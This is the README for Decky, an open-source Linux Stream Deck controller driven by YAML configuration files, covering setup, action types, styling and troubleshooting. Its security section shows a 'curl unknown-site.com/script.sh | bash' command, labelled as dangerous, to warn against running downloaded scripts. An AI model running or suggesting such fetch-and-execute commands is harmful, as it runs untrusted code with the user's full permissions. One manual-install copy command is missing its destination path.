# Decky - Simple YAML-Driven Stream Deck for Linux

[![Tests](https://github.com/adenix/decky/actions/workflows/tests.yml/badge.svg)](https://github.com/adenix/decky/actions/workflows/tests.yml)
[![Code Quality](https://github.com/adenix/decky/actions/workflows/lint.yml/badge.svg)](https://github.com/adenix/decky/actions/workflows/lint.yml)
[![Security](https://github.com/adenix/decky/actions/workflows/security.yml/badge.svg)](https://github.com/adenix/decky/actions/workflows/security.yml)
[![codecov](https://codecov.io/gh/adenix/decky/branch/main/graph/badge.svg)](https://codecov.io/gh/adenix/decky)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A lightweight, configuration-driven Stream Deck controller for Linux that uses simple YAML files instead of complex GUIs.

## Why Decky?

While there are several Stream Deck solutions for Linux (streamdeck-ui, streamdeck-linux-gui, etc.), Decky takes a different approach:

- **Simple YAML Configuration**: No GUI needed - just edit a YAML file
- **Version Control Friendly**: Keep your Stream Deck configs in git
- **Lightweight**: Minimal dependencies, no complex UI framework
- **Hot Reload**: Changes to config file are applied instantly
- **Extensible**: Easy to add new action types and features
- **Multiple Profiles**: Switch between different configs easily

## Features

- 🎯 **Simple Actions**: Run commands, send keypresses, switch pages
- 📄 **Multi-Page Support**: Organize buttons across multiple pages
- 🎨 **Customizable Styles**: Define reusable styles for consistent look
- 🔄 **Hot Configuration Reload**: Edit YAML and see changes instantly
- 🖼️ **Icon Support**: Use images or text labels for buttons
- 🔆 **Brightness Control**: Adjust Stream Deck brightness from buttons
- ⚡ **Multi-Actions**: Chain multiple actions together
- 👁️ **Visual Feedback**: Button flash on press

## Installation

### Prerequisites

- Linux (tested on Ubuntu/KDE, Fedora, Arch)
- Python 3.10+
- Stream Deck device

### Quick Setup

```bash
# Clone the repository
git clone https://github.com/yourusername/decky.git
cd decky

# Run setup script (requires sudo for udev rules)
chmod +x setup.sh
sudo ./setup.sh

# Install as a service (recommended)
./install-service.sh

# Start the service
systemctl --user start decky
```

### Install as Auto-Start Service (Recommended)

```bash
# Run the service installer
./install-service.sh

# This will:
# - Create ~/.decky/configs/ for your configurations
# - Install systemd user service for auto-start on login
# - Enable the service to run automatically
# - Copy example configs to get you started

# Start using Decky
systemctl --user start decky
```

### Manual Installation

If you prefer manual installation:

```bash
# Install system dependencies (Ubuntu/Debian)
sudo apt-get install python3-pip python3-venv libhidapi-libusb0 xdotool

# Create virtual environment
python3 -m venv .venv
.venv/bin/pip install -r requirements.txt

# Add udev rules for Stream Deck access
sudo cp /etc/udev/rules.d/70-streamdeck.rules
sudo udevadm control --reload-rules

# Run directly
./run.sh
```

## Usage

### Service Management

When installed as a service, use the `decky` command to manage Decky:

```bash
# Control commands
decky start             # Start the service
decky stop              # Stop the service
decky restart           # Restart the service
decky status            # Check service status
decky logs              # View live logs

# Configuration management
decky config list       # List available configs
decky config edit       # Edit current config (auto-reloads)
decky config use kde    # Switch to different config
decky config validate   # Validate current config

# Create and use custom configs
cp ~/.decky/configs/default.yaml ~/.decky/configs/work.yaml
decky config edit work
decky config use work
```

### Direct Usage (without service)

```bash
# Run with example config
./run.sh

# Run with custom config
./run.sh configs/kde.yaml

# Run with debug logging
./run.sh configs/minimal.yaml --log-level DEBUG
```

### Configuration Structure

```yaml
device:
  brightness: 75      # 0-100
  rotation: 0        # 0, 90, 180, 270

styles:
  default:
    font: "DejaVu Sans"
    font_size: 14
    text_color: "#FFFFFF"
    background_color: "#333333"

pages:
  main:
    name: "Main Page"
    buttons:
      1:  # Button number (1-15 for standard Stream Deck)
        label: "Terminal"
        icon: "terminal"    # Image name from images/ folder
        action:
          type: command
          command: "gnome-terminal"
```

## Action Types

### Command

Execute a shell command:

```yaml
action:
  type: command
  command: "firefox https://github.com"
```

### Keypress

Send keyboard shortcuts:

```yaml
action:
  type: keypress
  keys: ["ctrl", "alt", "t"]
```

### Page Switch

Navigate between button pages:

```yaml
action:
  type: page
  page: "development"
```

### Brightness Control

Adjust Stream Deck brightness:

```yaml
action:
  type: brightness
  change: 10  # or -10 to decrease
```

### Multi-Action

Chain multiple actions:

```yaml
action:
  type: multi
  actions:
    - type: command
      command: "echo 'First action'"
    - type: keypress
      keys: ["ctrl", "s"]
```

## Button Styling

### Using Text

```yaml
buttons:
  1:
    text: "Hello\nWorld"  # Multi-line text
    style: "custom"
```

### Using Icons

Icons can be specified in multiple ways:

```yaml
buttons:
  1:
    # Absolute path with ~ expansion
    icon: "~/.decky/icons/Duotone/red/play-pause.png"

  2:
    # Relative to ~/.decky/
    icon: "icons/Duotone/blue/terminal.png"

  3:
    # Just the filename (searches in ~/.decky/icons/)
    icon: "firefox.png"

  4:
    # Legacy: name without extension (searches in images/ folder)
    icon: "browser"  # Looks for browser.png, browser.jpg, etc.
```

Icon search order:

1. Absolute path (with `~` expansion)
1. Relative to `~/.decky/`
1. Relative to config file directory
1. In `~/.decky/icons/` directory
1. In legacy `images/` directory (for backward compatibility)

### Custom Styles

```yaml
styles:
  alert:
    background_color: "#FF0000"
    text_color: "#FFFFFF"
    font_size: 16

buttons:
  1:
    text: "Alert!"
    style: "alert"
```

## Advanced Configuration

### Dynamic Commands

Use environment variables and shell features:

```yaml
action:
  type: command
  command: "notify-send 'CPU Usage' \"$(top -bn1 | grep 'Cpu(s)' | cut -d' ' -f3)\""
```

### Workspace Navigation

```yaml
buttons:
  1:
    label: "Workspace 1"
    action:
      type: keypress
      keys: ["super", "1"]
```

### Media Controls

```yaml
buttons:
  1:
    label: "Play/Pause"
    action:
      type: keypress
      keys: ["XF86AudioPlay"]
```

## Comparison with Other Solutions

| Feature          | Decky        | streamdeck-ui | OpenDeck           |
| ---------------- | ------------ | ------------- | ------------------ |
| Configuration    | YAML files   | GUI           | GUI + Plugins      |
| Resource Usage   | Minimal      | Moderate      | Heavy              |
| Version Control  | ✅ Excellent | ❌ Database   | ❌ Complex         |
| Setup Complexity | Simple       | Moderate      | Complex            |
| Plugin System    | ❌ No        | ✅ Python     | ✅ Stream Deck SDK |
| Hot Reload       | ✅ Yes       | ❌ No         | ❌ No              |
| Dependencies     | Minimal      | Qt Framework  | Electron           |

## Tips and Tricks

### Multiple Configurations

With the service setup, switching between configs is easy:

```bash
# List available configs
decky config list

# Switch between configs instantly
decky config use work      # Work setup
decky config use gaming    # Gaming setup
decky config use streaming # Streaming setup

# Edit any config
decky config edit work
```

### Configuration Location

When installed as a service, configs are stored in `~/.decky/configs/`:

```
~/.decky/configs/
├── default.yaml    # Default config
├── kde.yaml        # KDE-specific config
├── work.yaml       # Your work config
├── gaming.yaml     # Gaming config
└── streaming.yaml  # Streaming config
```

### Git Integration

Keep your configs in version control:

```bash
# Add configs to your dotfiles repo
cd ~/dotfiles
ln -s ~/.decky/configs decky-configs
git add decky-configs
git commit -m "Add Stream Deck configurations"
```

### Service Auto-Start

The service is automatically installed as a user service that starts on login:

```bash
# Service is managed with systemctl --user commands
systemctl --user status decky   # Check status
systemctl --user enable decky   # Enable auto-start (done by installer)
systemctl --user disable decky  # Disable auto-start

# Or use the decky command
decky enable    # Enable auto-start
decky disable   # Disable auto-start
```

## Security Considerations

### ⚠️ Important Security Notice

**Decky is designed as a personal automation tool and executes commands with your full user permissions.**

Key security principles:

1. **Configuration files are code** - YAML configs can execute arbitrary shell commands via the `command` action type
1. **Only use trusted configs** - Never load configuration files from untrusted sources
1. **Review configs before use** - Always inspect YAML files before using them, especially from others
1. **User responsibility model** - Decky provides powerful automation, which requires responsible use

### Best Practices

```yaml
# ✅ SAFE - Commands you control
action:
  type: command
  command: "firefox https://github.com"

# ⚠️ REVIEW CAREFULLY - Dynamic commands
action:
  type: command
  command: "notify-send 'CPU' \"$(top -bn1 | grep 'Cpu(s)')\""

# ❌ DANGEROUS - Never use untrusted input
# Don't create configs that execute downloaded scripts
action:
  type: command
  command: "curl unknown-site.com/script.sh | bash"
```

### Version Control Your Configs

Keep your configurations in git and review changes:

```bash
cd ~/.decky/configs
git init
git add *.yaml
git commit -m "Initial Decky configs"
```

This allows you to:

- Track changes over time
- Review diffs before applying updates
- Rollback if something breaks
- Share configs safely with others (after review)

## Troubleshooting

### Stream Deck Not Detected

- Ensure udev rules are installed: `ls /etc/udev/rules.d/*streamdeck*`
- Replug the Stream Deck after installing rules
- Check USB connection: `lsusb | grep 0fd9`

### Permission Denied

- Make sure you're in the `plugdev` group: `groups`
- Logout and login again after setup

### Buttons Not Working

- Check xdotool is installed: `which xdotool`
- For Wayland, you may need to use `ydotool` instead

## Contributing

Contributions are welcome! Some ideas for improvements:

- [ ] Add more action types (HTTP requests, MQTT, etc.)
- [ ] Support for Stream Deck Plus dial/touchscreen
- [ ] Animation support for buttons
- [ ] Button state indicators (toggle buttons)
- [ ] Integration with system monitoring (CPU, memory, etc.)

## License

MIT License - See LICENSE file for details

## Acknowledgments

- Built on top of the excellent [python-elgato-streamdeck](https://github.com/abcminiuser/python-elgato-streamdeck) library
- Inspired by [deckmaster](https://github.com/muesli/deckmaster) (TOML-based config)
- Thanks to the Linux Stream Deck community
